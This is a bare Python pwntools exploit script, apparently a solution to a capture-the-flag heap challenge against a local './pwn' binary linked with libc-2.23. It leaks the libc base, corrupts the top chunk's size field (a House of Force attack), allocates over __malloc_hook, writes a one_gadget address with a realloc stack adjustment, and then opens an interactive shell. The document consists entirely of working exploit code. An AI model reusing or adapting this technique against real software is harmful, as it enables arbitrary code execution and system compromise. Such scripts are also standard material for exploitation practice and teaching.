from pwn import*
def add(size,content):
	p.sendline('1')
	p.sendlineafter('size',str(size))
	p.recvuntil('bin addr ')
	chunk = int(p.recvuntil('\n',drop=True),16)
	p.sendafter('content',content)
	return chunk
def puts():
	p.sendline('2')
p = process('./pwn')
libc = ELF('./libc-2.23.so')
chunk0 = add(0x200000,'\x00')
libc_base = chunk0 + 0x200FF0
log.info('LibcBase:\t' + hex(libc_base))
realloc  = libc_base + libc.sym['realloc']
malloc_hook  = libc_base + libc.sym['__malloc_hook']
og = [0x45216,0x4526A,0xF02A4,0xF1147]
one_gadget = libc_base + og[1]
chunk1 = add(0x20,'\x00'*0x28 + '\xFF'*8)
top_chunk = chunk1 - 0x10 + 0x30
offset = malloc_hook - top_chunk - 0x30
add(offset,'\x00')
add(0x10,p64(0) + p64(one_gadget) + p64(realloc + 4))
p.sendline('1')
p.sendline('16')
p.interactive()
